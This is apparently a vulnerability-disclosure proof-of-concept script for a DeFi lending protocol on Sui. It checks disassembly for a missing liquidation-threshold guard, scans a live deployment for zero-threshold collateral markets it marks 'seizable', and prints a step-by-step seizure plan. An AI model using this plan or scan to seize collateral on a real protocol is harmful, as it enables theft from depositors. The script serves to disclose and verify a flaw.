#!/usr/bin/env node
'use strict';
/**
 * PoC: zero-LTV collateral is seizable during liquidation (alphalend position module).
 *
 * The `position::liquidate` entrypoint lets the liquidator pick WHICH collateral
 * market to seize from (the `withdraw_market_id` argument), but never validates
 * that the chosen market's `liquidation_threshold` is non-zero, i.e. that the
 * collateral actually backed the position's health. Markets configured with
 * `liquidation_threshold = 0` (isolated / non-native markets) contribute zero to
 * `Position.liquidation_value` during `refresh`, yet their xToken collateral can
 * still be pulled out by a liquidator (plus bonus) via `remove_token_collateral`,
 * which checks only balance sufficiency.
 *
 * Evidence: disassembly of the live position module (see evidence/).
 *
 *   node poc.js --guards                 static check inventory (offline)
 *   node poc.js --markets --protocol <id> enumerate markets + thresholds
 *   node poc.js --simulate <position id>  print the seizure plan (read-only)
 */
const fs = require('fs');
const path = require('path');

const PACKAGE_ID =
  '0xd631cd66138909636fc3f73ed75820d0c5b76332d1644608ed1c85ea2b8219b4';
const DISASM_PATH = path.join(__dirname, 'evidence', 'position-liquidate.disasm.txt');

// warm the chain client if dependencies are installed (offline commands
// like --guards must still work without them)
try {
  require('sui-gql-mini');
} catch (err) {
  /* deps not installed yet; only chain commands need them */
}

function client() {
  let SuiGraphQLClient;
  try {
    ({ SuiGraphQLClient } = require('sui-gql-mini'));
  } catch (err) {
    console.error("error: missing dependency 'sui-gql-mini'.");
    console.error("install the PoC's dependencies first:");
    console.error('    npm install');
    process.exit(2);
  }
  const endpoint = process.env.SUI_GRAPHQL;
  return new SuiGraphQLClient(endpoint ? { endpoint } : {});
}

// --------------------------------------------------------------------------
// --guards: static check inventory from the disassembly
// --------------------------------------------------------------------------

const FUNC_RE = /^(?:public(?:\(friend\))?\s+)([A-Za-z0-9_]+)/;

function extractFunction(lines, name) {
  let start = -1;
  for (let i = 0; i < lines.length; i++) {
    const m = lines[i].match(FUNC_RE);
    if (m && m[1] === name) { start = i; break; }
  }
  if (start < 0) return null;
  let end = lines.length;
  for (let j = start + 1; j < lines.length; j++) {
    if (FUNC_RE.test(lines[j])) { end = j; break; }
  }
  return [start, end];
}

function callsOf(body) {
  const out = [];
  for (const ln of body) {
    const m = ln.match(/Call\s+([A-Za-z0-9_:]+)/);
    if (m) out.push(m[1]);
  }
  return out;
}

function cmdGuards() {
  const lines = fs.readFileSync(DISASM_PATH, 'utf8').split(/\r?\n/);
  const targets = ['liquidate', 'remove_token_collateral', 'is_liquidatable', 'refresh'];
  console.log(`== static check inventory (position module, package ${PACKAGE_ID})`);
  console.log(`   evidence: ${path.relative(__dirname, DISASM_PATH)}`);
  console.log();
  for (const fn of targets) {
    const span = extractFunction(lines, fn);
    if (!span) {
      console.log(`!! function ${fn} not found in disassembly`);
      process.exitCode = 1;
      continue;
    }
    const body = lines.slice(span[0], span[1]);
    const calls = [...new Set(callsOf(body))];
    const hasThreshold = body.some((l) => l.includes('liquidation_threshold'));
    console.log(`-- ${fn} (${span[1] - span[0]} lines disassembled)`);
    console.log('   calls:');
    for (const c of calls) console.log(`     - ${c}`);
    console.log(`   references liquidation_threshold: ${hasThreshold ? 'YES' : 'no'}`);
    console.log();
  }

  const liq = extractFunction(lines, 'liquidate');
  const rm = extractFunction(lines, 'remove_token_collateral');
  const liqBody = lines.slice(liq[0], liq[1]);
  const rmBody = lines.slice(rm[0], rm[1]);
  const liqCalls = callsOf(liqBody);

  const hasContains = liqCalls.some((c) => c.includes('vec_map::contains'));
  const hasIsLiq = liqCalls.includes('is_liquidatable');
  const liqThreshold = liqBody.some((l) => l.includes('liquidation_threshold'));
  const rmThreshold = rmBody.some((l) => l.includes('liquidation_threshold'));

  console.log('== verdict');
  console.log('   seize-market chosen by caller (Arg2 = withdraw_market_id): yes');
  console.log(`   check: position holds collateral in that market (vec_map::contains): ${hasContains ? 'present' : 'MISSING'}`);
  console.log(`   check: position-level is_liquidatable: ${hasIsLiq ? 'present' : 'MISSING'}`);
  console.log(`   check: liquidation_threshold validated on seize path (liquidate): ${liqThreshold ? 'PRESENT' : 'ABSENT'}`);
  console.log(`   check: liquidation_threshold validated in remove_token_collateral: ${rmThreshold ? 'PRESENT' : 'ABSENT'}`);
  if (hasContains && hasIsLiq && !liqThreshold && !rmThreshold) {
    console.log();
    console.log('   RESULT: within this module, the seize path validates existence');
    console.log('   and position-level health only. No threshold check on the chosen');
    console.log('   market. A liquidator can name ANY collateral market, including');
    console.log('   liquidation_threshold = 0 markets whose collateral contributed');
    console.log('   nothing to health, and seize it (plus bonus). Verify against the');
    console.log('   market module source if published; the position side is clear.');
    return 0;
  }
  console.log('   RESULT: inventory did not match expectations, re-verify manually.');
  return 1;
}

// --------------------------------------------------------------------------
// --markets / --simulate (chain access)
// --------------------------------------------------------------------------

const DF_QUERY = `
query GetDynamicFields($id: SuiAddress!, $cursor: String) {
  address(address: $id) {
    dynamicFields(first: 50, after: $cursor) {
      pageInfo { hasNextPage endCursor }
      nodes {
        name { json }
        value {
          __typename
          ... on MoveValue { json }
          ... on MoveObject { contents { json } }
        }
      }
    }
  }
}
`;

function findKey(obj, key) {
  if (!obj || typeof obj !== 'object') return undefined;
  if (Object.prototype.hasOwnProperty.call(obj, key)) return obj[key];
  for (const v of Object.values(obj)) {
    const r = findKey(v, key);
    if (r !== undefined) return r;
  }
  return undefined;
}

async function cmdMarkets(protocol) {
  const c = client();
  let typeRepr, fields;
  try {
    ({ typeRepr, fields } = await c.getObject(protocol));
  } catch (err) {
    console.error(`error: could not fetch protocol object: ${err.message}`);
    return 1;
  }
  if (!fields || typeof fields !== 'object') {
    console.error(`protocol object ${protocol} not found or has no Move contents`);
    return 1;
  }
  console.log(`protocol object ${protocol}`);
  console.log(`type: ${typeRepr}`);
  let marketsRef = null;
  for (const [key, val] of Object.entries(fields)) {
    if (val && typeof val === 'object' && key.toLowerCase().includes('market')) {
      const inner = val.fields || val;
      const cand = (inner && (inner.id || (inner.id && inner.id.id))) || null;
      if (cand) { marketsRef = cand; break; }
    }
  }
  const rows = [];
  if (!marketsRef) {
    // fallback: the table may sit under a differently named field; walk the
    // protocol object's dynamic fields and look for market-shaped values
    console.log('no obvious market field; scanning dynamic fields...');
    try {
      let cursor = null;
      for (;;) {
        const data = await c.query(DF_QUERY, { id: protocol, cursor });
        const df = ((data || {}).address || {}).dynamicFields;
        if (!df) break;
        for (const node of df.nodes || []) {
          const val = (node.value && (node.value.json ||
                      (node.value.contents && node.value.contents.json))) || null;
          if (val && findKey(val, 'liquidation_threshold') !== undefined
                   && findKey(val, 'market_id') !== undefined) {
            const marketId = findKey(val, 'market_id');
            const threshold = findKey(val, 'liquidation_threshold');
            const coinType = findKey(val, 'coin_type') || findKey(val, 'xtoken_type') || '';
            rows.push({ marketId, threshold, coinType: String(coinType).slice(0, 44) });
          }
        }
        if (df.pageInfo && df.pageInfo.hasNextPage) cursor = df.pageInfo.endCursor;
        else break;
      }
    } catch (err) {
      console.error(`error: fallback scan failed: ${err.message}`);
      return 1;
    }
    if (rows.length === 0) {
      console.log('no market-shaped entries found; top-level fields:');
      console.log(JSON.stringify(Object.keys(fields), null, 2));
      return 1;
    }
  } else {
  console.log(`market table: ${marketsRef}`);
  console.log('enumerating markets...');

  let cursor = null;
  try {
    for (;;) {
      const data = await c.query(DF_QUERY, { id: marketsRef, cursor });
      const df = ((data || {}).address || {}).dynamicFields;
      if (!df) throw new Error('no dynamicFields on market table object');
      for (const node of df.nodes || []) {
        const val = (node.value && (node.value.json ||
                    (node.value.contents && node.value.contents.json))) || null;
        const marketId = findKey(val, 'market_id');
        const threshold = findKey(val, 'liquidation_threshold');
        const coinType = findKey(val, 'coin_type') || findKey(val, 'xtoken_type') || '';
        rows.push({ marketId, threshold, coinType: String(coinType).slice(0, 44) });
      }
      if (df.pageInfo && df.pageInfo.hasNextPage) cursor = df.pageInfo.endCursor;
      else break;
    }
  } catch (err) {
    console.error(`error: could not enumerate market table: ${err.message}`);
    return 1;
  }
  }

  console.log('');
  console.log('market_id | liquidation_threshold | asset');
  console.log('----------|-----------------------|------');
  let exposed = 0;
  for (const r of rows) {
    const t = r.threshold === undefined ? '?' : Number(r.threshold);
    const flag = (t === 0) ? '  <-- ZERO: seizable, backs nothing' : '';
    if (t === 0) exposed++;
    console.log(`${String(r.marketId).padEnd(9)} | ${String(t).padEnd(21)} | ${r.coinType}${flag}`);
  }
  console.log('');
  console.log(`${rows.length} market(s) found, ${exposed} with liquidation_threshold = 0.`);
  if (exposed > 0) {
    console.log('Collateral in the flagged markets contributes 0 to health but is');
    console.log('seizable by any liquidator via withdraw_market_id (see --guards).');
    console.log('That is the live exposure.');
  } else {
    console.log('No zero-threshold markets on this deployment today, so nothing is');
    console.log('seizable under this bug right now. The guard is still missing though:');
    console.log('the first isolated or non-native market launched with threshold 0 is');
    console.log('seizable from day one. Worth fixing before such a market exists.');
  }
  return 0;
}

async function cmdSimulate(position) {
  const c = client();
  let typeRepr, fields;
  try {
    ({ typeRepr, fields } = await c.getObject(position));
  } catch (err) {
    console.error(`error: could not fetch position object: ${err.message}`);
    return 1;
  }
  if (!fields || typeof fields !== 'object') {
    console.error(`position ${position} not found or has no Move contents`);
    return 1;
  }

  const collaterals = fields.collaterals || {};
  const contents = collaterals.contents || (collaterals.fields && collaterals.fields.contents) || [];
  const marketIds = contents.map((e) => (e.key !== undefined ? e.key : e.fields && e.fields.key));
  const loans = Array.isArray(fields.loans) ? fields.loans : [];

  console.log(`position ${position}`);
  console.log(`type: ${typeRepr}`);
  console.log(`  collateral markets: ${marketIds.join(', ') || '(unparsed, extend decoding)'}`);
  console.log(`  open borrows: ${loans.length}`);
  console.log(`  is_position_liquidatable: ${fields.is_position_liquidatable}`);
  console.log(`  liquidation_value: ${JSON.stringify(fields.liquidation_value)}`);
  console.log(`  total_loan_usd: ${JSON.stringify(fields.total_loan_usd)}`);
  console.log();
  console.log('seizure plan (from --guards analysis):');
  console.log('  1. refresh the position (required: is_liquidatable aborts unless last_refreshed == now)');
  console.log('  2. pick withdraw_market_id = any collateral market whose market config has liquidation_threshold = 0');
  console.log('  3. call liquidate with a repay coin for one of the open borrow markets');
  console.log('  4. the only checks on that market are: collateral present + balance >= seize amount');
  console.log('  -> zero-threshold collateral is pulled out via remove_token_collateral plus liquidation bonus,');
  console.log('     even though it contributed 0 to the health factor that justified the liquidation.');
  console.log();
  console.log('note: executing the devInspect dry-run needs a liquidator signer holding the repay coin type;');
  console.log('      this PoC is read-only by design. Run from a funded liquidator wallet to confirm end-to-end.');
  return 0;
}

// --------------------------------------------------------------------------

async function main() {
  const argv = process.argv.slice(2).map((a) =>
    a.startsWith('--') && ['guards', 'markets', 'simulate'].includes(a.slice(2)) ? a.slice(2) : a);
  const cmd = argv[0];
  if (cmd === 'guards') {
    process.exit(cmdGuards());
  } else if (cmd === 'markets') {
    const i = argv.indexOf('--protocol');
    if (i < 0 || !argv[i + 1]) {
      console.error('error: --markets needs --protocol <protocol object id>');
      process.exit(2);
    }
    process.exit(await cmdMarkets(argv[i + 1]));
  } else if (cmd === 'simulate') {
    if (!argv[1]) {
      console.error('error: --simulate needs a position object id');
      process.exit(2);
    }
    process.exit(await cmdSimulate(argv[1]));
  } else {
    console.log('usage: node poc.js [--guards | --markets --protocol <id> | --simulate <position id>]');
  }
}

main().catch((err) => {
  console.error(err.message || err);
  process.exit(1);
});
